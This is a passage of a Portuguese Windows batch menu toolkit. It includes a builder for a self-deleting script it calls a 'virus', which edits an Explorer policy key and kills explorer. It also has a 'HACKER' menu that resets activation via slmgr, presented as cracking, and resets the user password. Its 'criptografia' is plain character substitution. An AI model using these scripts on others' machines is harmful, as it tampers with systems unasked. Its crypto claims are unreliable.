echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto inp2
:a64
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a64
)
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewContextMenu /t REG_DWORD /d 0x00000000 /f >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto inp2
 

::===================================== 11  HACKER ================================
 

echo off
 

 : HACKER 

CLS
time /t
date /t
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo                     HACKER            
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ               
color 0f
echo  อ           a) Crackear o Sistema
echo  อ           b) Exibir Originalidade
echo  อ           c) Certificados  de Usuarios
echo  อ           d) Definir acessos a Programas
echo  อ           e) Painel de Controle
echo  อ           f) Prompt de Comando
echo  อ           g) Discagem Telefonica
echo  อ           h) Visualizador de Eventos    
echo  อ           i) Iexpress     
echo  อ           j) Teste de Memoria  
echo  อ           l) Informa็ใo do Sistema  
echo  อ           m) Ativar ou Desativar Recursos
echo  อ           n) Firewall do Windows
echo  อ           o) zerar senha do USUARIO
echo  อ           p) Regedit
echo  อ           V) VOLTAR PARA O MENU
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo:                     DEDE WIZARD                                                                        
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
SET /P OP=Digite sua op็โo? 
if %op% equ a goto a
if %op% equ b goto b
if %op% equ c goto c
if %op% equ d goto d
if %op% equ e goto e
if %op% equ f  goto  f
if %op% equ g goto disk
if %op% equ h goto h
if %op% equ  i goto  i
if %op% equ j goto j
if %op% equ l  goto  l
if %op% equ m goto m
if %op% equ n goto n
if %op% equ  o goto o
if %op% equ  p goto p
if %op% equ  V goto V
if %op% equ  v goto v

:a
slmgr -rearm
WindowsAnytimeUpgradeResults


CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto HACKER


 :b
slui

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto HACKER


:c

certmgr.msc
CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto HACKER

:d
ComputerDefaults
CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto HACKER

:e
control
CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto HACKER

:f
cls
cmd
CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto HACKER

:disk
dialer
CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto HACKER

:h
eventvwr
CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto HACKER

:i
iexpress
CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto HACKER

:j
MdSched
CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto HACKER

:l
msinfo32
CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto HACKER

:m
OptionalFeatures
CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto HACKER

:N
 C:\Windows\System32\WF.msc
CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto HACKER

:o
NET USER %username% *
goto HACKER

:p
regedt32
goto HACKER

:v
goto ultimat



::======================================= 12 BAGUNวA ============================== 
 
programas para baixar
http://www.4shared.com/dir/4935255/b1ba011e/s
======================================================


======================================================

:boot
cls
title                  BOOT NO PEN DRIVER
color 8f
time /t
date /t  
echo  ************************************************************
echo  *********   CRIAR BOOT NO PEN DRIVER    ******
echo  ************************************************************
@echo off
echo abrir cmd em modo de administrador
echo diskpart
echo list disk
echo select disk {numero ou letra do pen drive }
echo clean
echo create partition primary
echo active
echo format fs=fat32 quick
echo assign
echo exit
echo d:
echo d:\cd boot
echo bootsect /nt60 { letra do pendriver}
echo cd..
echo xcopy [unidade do windows]:*.* /s/e/f [unidade do pen driver]:
echo ======================================================
echo programas para baixar
echo http://www.4shared.com/dir/4935255/b1ba011e/s
echo ======================================================
echo.
echo  codigo do aereo do windows
echo.
echo CODIGO DO ATALHO:C:\Windows\System32\rundll32.exe DwmApi #105
pause
cls
goto ultimat

::==========================  PROGRAMAS ADM  ================================
:ADM
echo.
echo.
echo ออออออออออออออออออออ 
echo PROGRAMAS ADIMINISTRATIVOS
echo ออออออออออออออออออออ
echo.
echo.
echo.
ping -n 3 localhost>nul

cd C:\Users\%Username%\Desktop
md  ADM
cd ADM
echo Netplwiz.exe >C:\Users\%Username%\Desktop/ADM/"CONTAS DE USUARIOS".bat
echo rstrui.exe >C:\Users\%Username%\Desktop/ADM/" RESTAURAR O SISTEMA ".bat
echo sdclt.exe >C:\Users\%Username%\Desktop/ADM/" BACKUP ".bat
echo services.msc >C:\Users\%Username%\Desktop/ADM/" SERVICOS ".bat
echo shrpubw.exe >C:\Users\%Username%\Desktop/ADM/" PASTA COMPARTILHADA ".bat
echo WindowsAnytimeUpgradeResults.exe>C:\Users\%Username%\Desktop/ADM/" COMFIRMACAO DE ATUALIZACAO ".bat
echo winver.exe >C:\Users\%Username%\Desktop/ADM/" VERSAO DO WINDOWS ".bat
echo msconfig.exe>C:\Users\%Username%\Desktop/ADM/" CONFIGURAR O SISTEMA ".bat
echo MdSched.exe >C:\Users\%Username%\Desktop/ADM/" DIAGNOSTICO DE MEMORIA ".bat
echo  lusrmgr.msc >C:\Users\%Username%\Desktop/ADM/" USUARIOS E GRUPOS LOCAIS ".bat
echo  Magnify.exe >C:\Users\%Username%\Desktop/ADM/"  LUPA".bat
echo logoff.exe >C:\Users\%Username%\Desktop/ADM/" TRAVA PC ".bat
echo  hdwwiz.exe >C:\Users\%Username%\Desktop/ADM/" ADICIONA  HARDWERE ".bat
echo  gpedit.msc >C:\Users\%Username%\Desktop/ADM/" DIRETIVAS DE GRUPOS ".bat
echo credwiz >C:\Users\%Username%\Desktop/ADM/" BACKUP DE SENHA".bat
echo devmgmt >C:\Users\%Username%\Desktop/ADM/" GERENCIADOR DE DISPOSITIVOS".bat
echo   diskmgmt >C:\Users\%Username%\Desktop/ADM/" GERENCIADOR DE DISCO".bat
echo DispaySwitch.exe  >C:\Users\%Username%\Desktop/ADM/" DISPLAY DE NOT BOOK".bat
echo  eventvwr.exe >C:\Users\%Username%\Desktop/ADM/" VISUALIZADOR DE EVENTOS".bat
echo mblctr.exe  >C:\Users\%Username%\Desktop/ADM/" WINDOWS MOBILE CENTER".bat
echo  migwiz.exe >C:\Users\%Username%\Desktop/ADM/" TRANSFERENCIA FACIL DO WINDOWS".bat
echo  mstsc.exe >C:\Users\%Username%\Desktop/ADM/" CONTROLE REMOTO".bat
echo printmanagement >C:\Users\%Username%\Desktop/ADM/" GERENCIADOR DE IMPRESSAO".bat
echo psr.exe  >C:\Users\%Username%\Desktop/ADM/" GRAVADOR DE PASSO A PASSO".bat
echo recdisc.exe  >C:\Users\%Username%\Desktop/ADM/" CRIAR DISCO DE SISTEMA".bat
echo  slui.exe >C:\Users\%Username%\Desktop/ADM/" VERIFICAR A ATIVAวAO DO WINDOWS".bat
echo Sndvol  >C:\Users\%Username%\Desktop/ADM/" VOLUME".bat
echo WindowsAnytimeUpgradeResults  >C:\Users\%Username%\Desktop/ADM/" RESULTADO DE UPGRAD".bat
echo  md GodMode.{ED7BA470-8E54-465E-825C-99712043E01C} >C:\Users\%Username%\Desktop/ADM
echo regsvr32 mydocs.dll  >C:\Users\%Username%\Desktop/ADM/" RECUPERAR DOC,IMG &VIDEO DO ADM  ".bat
echo regsvr32/u mydocs.dll  >C:\Users\%Username%\Desktop/ADM/" APAGAR DOC,IMG &VIDEO DO ADM  ".bat
echo START TEMP >C:\Users\%Username%\Desktop/ADM/" LIMPESA ".bat
echo START %%TEMP%% >>C:\Users\%Username%\Desktop/ADM/" LIMPESA ".bat
echo START  PREFETCH >>C:\Users\%Username%\Desktop/ADM/" LIMPESA ".bat
echo CD C:\Windows\System32  >>C:\Users\%Username%\Desktop/ADM/" LIMPESA ".bat
echo START cleanmgr.exe  >>C:\Users\%Username%\Desktop/ADM/" LIMPESA ".bat
echo START defrag.exe  >>C:\Users\%Username%\Desktop/ADM/" LIMPESA ".bat


echo MsgBox " PASTA [ ADM ] CRIADA COM SUCESSO NA SUA AREA DE TRABALHO ",vbOKOnly + vbInformation, "WYZARD CORP" >%temp%\wyz.vbs
start %temp%\wyz.vbs

goto menu
::====================CRIPTOGRAFIA DE CARACTERES========================


:crip
@echo off 
mode 92,18 
cls 
color 0a 
title Script ( js ) Script 
echo. 
echo                         ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ 
echo                         ณ        * CRIE SUA CHAVE UNICA *        ณ 
echo                         ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู 
echo                                  01101010 01110011 00100000      
echo  อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ 
::echo  ๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕ 
echo  บบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบ 
echo  บบบบบบบบบบบฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟบบบบบบบบบ 
echo  บบบบบบบบบบบณ   Criptografa - 1   ณ ณ #@จ**(`Jybryvcdtr$#@!yw?//็7+ง.+ ฃ?*$?{ช ณบบบบบบบบบ 
echo  บบบบบบบบบบบภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤูบบบบบบบบบ 
echo  บบบบบบบบบบบฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟบบบบบบบบบ 
echo  บบบบบบบบบบบณ     js Criptografia em Script.bat        ณ ณ 2 - afargotpircseD  ณบบบบบบบบบ 
echo  บบบบบบบบบบบภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤูบบบบบบบบบ 
echo  บบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบ 
::echo  ๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕ 
echo  อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ 
echo. 
Set /p crip= Digite js 1  2 - 
if "%crip%" == "1" goto m1 
if "%crip%" ==  "2" goto M2 
if "%crip%" == "js" goto vs2 
echo msgbox "Erro ( %crip% ) nใo ้ um comando valido ",vbinformation,"  AVISO" >%temp%\cri.vbs 
start %temp%\cri.vbs 
goto crip 
:vs2 
mode 92,20 
cls 
color 0c 
title Script ( js ) Script 
echo. 
echo                         ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ 
echo                         ณ    * Voce esta em Security Master *    ณ 
echo                         ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู 
echo                                01101010 01110011 00100000 = js \\// CR = CRIA SCRIPT    
echo  อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ 
echo  ๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕ 
echo  บบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบ 
echo  บบบบบบบบบบบฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟบบบบบบบบบ 
echo  บบบบบบบบบบบณ   Criptografa - 1   ณ ณ #@จ**(`Jybryvcdtr$#@!yw?//็7+ง.+ ฃ?*$?{ช ณบบบบบบบบบ 
echo  บบบบบบบบบบบภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤูบบบบบบบบบ 
echo  บบบบบบบบบบบฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟบบบบบบบบบ 
echo  บบบบบบบบบบบณ     js Criptografia em Script.bat        ณ ณ 2 - afargotpircseD  ณบบบบบบบบบ 
echo  บบบบบบบบบบบภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤูบบบบบบบบบ 
echo  บบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบ 
echo  ๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕ 
echo  อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ 
echo. 
Set /p crip= Digite js 1  2 - 
if "%crip%" == "js" goto crip 
if "%crip%" == "1" goto m3 
if "%crip%" == "2" goto m4 
if "%crip%" == "CR" goto  CR
echo msgbox "Erro ( %crip% ) nใo ้ um comando valido ",vbinformation,"  AVISO" 
start %temp%\cri.vbs 
:m1  
mode 92,10 
cls  
echo. 
echo  บบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบ 
echo  อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ 
echo. 
echo. 
set /p opt2= Digite o texto =) 
FOR /F "tokens=*" %%A IN ("%opt2%") DO ( 
set s=%%A 
) 
::CRIPTOGRAFA  
set s=%s: =00100000 % 
set s=%s:a=01100001 % 
set s=%s:b=01100010 % 
set s=%s:c=01100011 % 
set s=%s:d=01100100 % 
set s=%s:e=01100101 % 
set s=%s:f=01100110 % 
set s=%s:g=01100111 % 
set s=%s:h=01101000 % 
set s=%s:i=01101001 % 
set s=%s:j=01101010 % 
set s=%s:k=01101011 % 
set s=%s:l=01101100 % 
set s=%s:m=01101101 % 
set s=%s:n=01101110 % 
set s=%s:o=01101111 % 
set s=%s:p=01110000 % 
set s=%s:q=01110001 % 
set s=%s:r=01110010 % 
set s=%s:s=01110011 % 
set s=%s:t=01110100 % 
set s=%s:u=01110101 % 
set s=%s:v=01110110 % 
set s=%s:w=01110111 % 
set s=%s:x=01111000 % 
set s=%s:y=01111001 % 
set s=%s:z=01111010 % 
set s=%s:!=00100001 % 
set s=%s:,=00101100 % 
set s=%s:.=00101110 % 
set s=%s:@=00010111 % 
set s=%s:?=00111110 % 
set s=%s::=001110 % 
echo %s% > TEXTO_CRIPTOGRAFADO.txt 
start TEXTO_CRIPTOGRAFADO.txt 
goto crip
:m2  
mode 92,10 
cls  
echo. 
echo  บบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบ 
echo  อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ 
echo. 
echo. 
set /p opt2= Cole o texto =) 
FOR /F "tokens=*" %%B IN ("%opt2%") DO ( 
set s=%%B 
) 
::DESCRIPTOGRAFA  
set s=%s:00100000 = % 
set s=%s:01100001 =a% 
set s=%s:01100010 =b% 
set s=%s:01100011 =c% 
set s=%s:01100100 =d% 
set s=%s:01100101 =e% 
set s=%s:01100110 =f% 
set s=%s:01100111 =g% 
set s=%s:01101000 =h% 
set s=%s:01101001 =i% 
set s=%s:01101010 =j% 
set s=%s:01101011 =k% 
set s=%s:01101100 =l% 
set s=%s:01101101 =m% 
set s=%s:01101110 =n% 
set s=%s:01101111 =o% 
set s=%s:01110000 =p% 
set s=%s:01110001 =q% 
set s=%s:01110010 =r% 
set s=%s:01110011 =s% 
set s=%s:01110100 =t% 
set s=%s:01110101 =u% 
set s=%s:01110110 =v% 
set s=%s:01110111 =w% 
set s=%s:01111000 =x% 
set s=%s:01111001 =y% 
set s=%s:01111010 =z% 
set s=%s:00100001 =!% 
set s=%s:00101100 =,% 
set s=%s:00101110 =.% 
set s=%s:00010111 =@% 
set s=%s:00111110 =?% 
set s=%s:001110 =:% 
echo.> %temp%\cript.cmd 
echo @echo off >> %temp%\cript.cmd 
echo mode 91,10 >> %temp%\cript.cmd 
echo color 1f >> %temp%\cript.cmd 
echo title.                                  Script ( js ) Script >> %temp%\cript.cmd 
echo echo.>> %temp%\cript.cmd 
echo echo  อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ >> %temp%\cript.cmd 
echo echo.>> %temp%\cript.cmd 
echo echo  Sua chave =)  %s%>> %temp%\cript.cmd 
echo echo.>> %temp%\cript.cmd 
echo echo.>> %temp%\cript.cmd 
echo pause>> %temp%\cript.cmd 
echo %js% > TEXTO_DESCRIPTOGRAFADO.txt 
echo exit>> %temp%\cript.cmd 
start %temp%\cript.cmd 
echo. >%temp%\jsb.vbs 
echo %s% > TEXTO_DESCRIPTOGRAFADO.txt 
echo StrText = " %s%" >> %temp%\jsb.vbs 
echo set ObjVoice = CreateObject("SAPI.SpVoice") >> %temp%\jsb.vbs 
echo ObjVoice.Rate=-1>> %temp%\jsb.vbs 
echo ObjVoice.Speak StrText  >> %temp%\jsb.vbs 
start %temp%\jsb.vbs 
goto :vs 
:m3  
echo. > %temp%\jsb.vbs 
echo.> %temp%\cript.cmd 
cls  
echo. 
echo  บบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบ 
echo  อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ 
echo. 
echo.  
set /p opt1= Digite o texto =)  
FOR /F "tokens=*" %%A IN ("%opt1%") DO ( 
set js=%%A 
) 
echo .  
::CRIPTOGRAFA TEXTO FAวA A ALTERAวรO COMO MOSTRADO NO VอDEO
::COPIAR O CำDIGO DAQUI ATE A LINHA QUE MANDO PARAR 
set js=%js: =7820  %
 ::01 
set js=%js:a=18497 %
 ::02 
set js=%js:b=27864 %
 ::03 
set js=%js:c=15134 %
 ::04 
set js=%js:d=30871 %
 ::05 
set js=%js:e=29179 %
 ::06 
set js=%js:f=12371 %
 ::07 
set js=%js:g=30195 %
 ::08 
set js=%js:h=25225 %
 ::09 
set js=%js:i=26137 %
 ::10 
set js=%js:j=14946 %
 ::11 
set js=%js:k=12234 %
 ::12 
set js=%js:l=2876 %
 ::13 
set js=%js:m=20119 %
 ::14 
set js=%js:n=10595 %
 ::15 
set js=%js:o=30869 %
 ::16 
set js=%js:p=16812 %
 ::17 
set js=%js:q=529 %
 ::18 
set js=%js:r=28369 %
 ::19 
set js=%js:s=23545 %
 ::20 
set js=%js:t=698 %
 ::21 
set js=%js:u=27259 %
 ::22 
set js=%js:v=27424 %
 ::23 
set js=%js:w=7589 %
 ::24 
set js=%js:x=5161 %
 ::25 
set js=%js:y=17426 %
 ::26 
set js=%js:z=232 %
 ::27 
 ::28 
set js=%js:.=4067 %
 ::29 
set js=%js:@=20717 %
 ::30 
set js=%js::=18578 %
 ::31 
set js=%js:!=25414 %
 ::32 
set js=%js:;=14444 %
 ::33 
set js=%js:,=2725 %
 ::34 
set js=%js:?=6826 %
::ACELEวรO PARA AQUI AGORA COPIA O CำDEGO 
echo %js% > TEXTO_CRIPTOGRAFADO_MASTER.txt 
